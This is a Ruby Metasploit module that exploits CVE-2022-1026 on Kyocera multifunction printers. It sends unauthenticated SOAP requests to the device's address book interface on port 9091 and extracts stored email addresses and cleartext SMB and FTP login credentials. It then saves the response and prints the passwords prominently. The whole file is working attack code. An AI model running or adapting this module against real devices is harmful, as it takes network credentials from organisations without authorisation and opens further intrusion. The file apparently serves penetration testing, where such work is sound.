# frozen_string_literal: true

# Kyocera address book credential extraction for Metasploit
#
# This module recreates the behavior of the standalone getKyoceraCreds.py script
# and allows operators to run it directly inside msfconsole.
#
# References:
# * CVE-2022-1026
# * https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/

require 'msf/core'
require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kyocera Address Book Disclosure (MSF)',
        'Description' => %q{
          Extracts sensitive information (email addresses, SMB/FTP credentials) from
          vulnerable Kyocera MFPs via the unauthenticated SOAP interface on TCP/9091.
          The module mirrors the original getKyoceraCreds.py proof of concept and
          retrieves the full address book, highlighting cleartext credentials when
          present.
        },
        'Author' => [
          'ushastoe',
          'Aaron Herndon',
          'ac3lives',
          'fatalesp',
        ],
        'References' => [
          ['CVE', '2022-1026'],
          ['URL', 'https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/']
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'SSL' => true }
      )
    )

    register_options(
      [
        Opt::RPORT(9091),
        OptString.new('TARGETURI', [true, 'SOAP endpoint', '/ws/km-wsdl/setting/address_book']),
        OptInt.new('WAIT', [true, 'Seconds to wait for address book creation', 5])
      ]
    )
  end

  def run_host(ip)
    vprint_status("Connecting to #{ip}:#{rport} ...")
    enumeration = request_enumeration
    return unless enumeration

    sleep datastore['WAIT']
    request_address_book(enumeration)
  end

  private

  def soap_body(action, payload)
    <<~XML
      <?xml version="1.0" encoding="utf-8"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
        <SOAP-ENV:Header>
          <wsa:Action SOAP-ENV:mustUnderstand="true">#{action}</wsa:Action>
        </SOAP-ENV:Header>
        <SOAP-ENV:Body>#{payload}</SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
    XML
  end

  def request_enumeration
    action = 'http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration'
    payload = '<ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest>'

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri),
      'method' => 'POST',
      'ctype' => 'application/soap+xml',
      'data' => soap_body(action, payload)
    )

    unless res&.code == 200
      print_error("#{peer} - Unexpected response when requesting enumeration (HTTP #{res&.code || 'No Response'})")
      return nil
    end

    enumeration = res.body.to_s[/<[^>]*enumeration>([^<]+)<\/[^>]*enumeration>/, 1]
    unless enumeration
      print_error("#{peer} - Failed to parse enumeration token from response")
      vprint_error(res.body)
      return nil
    end

    print_status("#{peer} - Received address book object #{enumeration}; waiting for generation")
    enumeration
  end

  def request_address_book(enumeration)
    action = 'http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list'
    payload = "<ns1:get_personal_address_listRequest><ns1:enumeration>#{enumeration}</ns1:enumeration></ns1:get_personal_address_listRequest>"

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri),
      'method' => 'POST',
      'ctype' => 'application/soap+xml',
      'data' => soap_body(action, payload)
    )

    unless res&.code == 200
      print_error("#{peer} - Failed to retrieve address book (HTTP #{res&.code || 'No Response'})")
      return
    end

    doc = res.get_xml_document
    unless doc
      print_error("#{peer} - Unable to parse XML body from address book response")
      return
    end

    # Drop namespaces so we can use concise XPath lookups
    doc.remove_namespaces!

    store_loot('kyocera.address_book.xml', 'text/xml', rhost, res.body, 'address_book.xml', 'Kyocera address book SOAP response')
    report_results(doc)
  end

  def credential_entries(doc)
    interesting = %w[login_name user_name login_password email_address emailaddress]
    entries = []

    doc.xpath('//*').each do |element|
      data = {}
      element.element_children.each do |child|
        key = child.name
        next unless interesting.include?(key)

        data[key] = child.text&.strip
      end
      entries << data unless data.empty?
    end

    entries
  end

  def text_at(element, path)
    element.at_xpath(path)&.text&.strip
  end

  def parsed_addresses(doc)
    addresses = []
    doc.xpath('//personal_address').each do |addr|
      addresses << {
        id: text_at(addr, 'name_information/id'),
        name: text_at(addr, 'name_information/name'),
        furigana: text_at(addr, 'name_information/furigana'),
        email: text_at(addr, 'email_information/address'),
        ftp_server: text_at(addr, 'ftp_information/server_name'),
        ftp_port: text_at(addr, 'ftp_information/port_number'),
        ftp_login: text_at(addr, 'ftp_information/login_name') || text_at(addr, 'ftp_information/user_name'),
        ftp_password: text_at(addr, 'ftp_information/login_password'),
        smb_server: text_at(addr, 'smb_information/server_name'),
        smb_port: text_at(addr, 'smb_information/port_number'),
        smb_login: text_at(addr, 'smb_information/login_name') || text_at(addr, 'smb_information/user_name'),
        smb_password: text_at(addr, 'smb_information/login_password')
      }
    end

    addresses.reject { |entry| entry.values.all?(&:nil?) }
  end

  def report_results(doc)
    entries = credential_entries(doc)
    if entries.any?
      print_good("#{peer} - Found #{entries.length} credential-containing entries")
      entries.each_with_index do |entry, idx|
        print_good("  [Entry #{idx + 1}]")
        entry.each do |key, value|
          next unless value

          label = key.downcase.include?('password') ? "#{key}: #{highlight_password(value)}" : "#{key}: #{value}"
          print_good("    #{label}")
        end
      end
    end

    addresses = parsed_addresses(doc)
    return unless addresses.any?

    if entries.empty?
      print_status("#{peer} - No explicit credentials found; displaying parsed address book entries")
    end

    addresses.each_with_index do |addr, idx|
      print_status("  [Contact #{idx + 1}]")
      addr.each do |key, value|
        next if value.nil? || value.empty?

        label = key.to_s.downcase.include?('password') ? "#{key}: #{highlight_password(value)}" : "#{key}: #{value}"
        print_status("    #{label}")
      end
    end
  end

  def highlight_password(value)
    "\e[91m!! ПАРОЛЬ: #{value} !!\e[0m"
  end
end
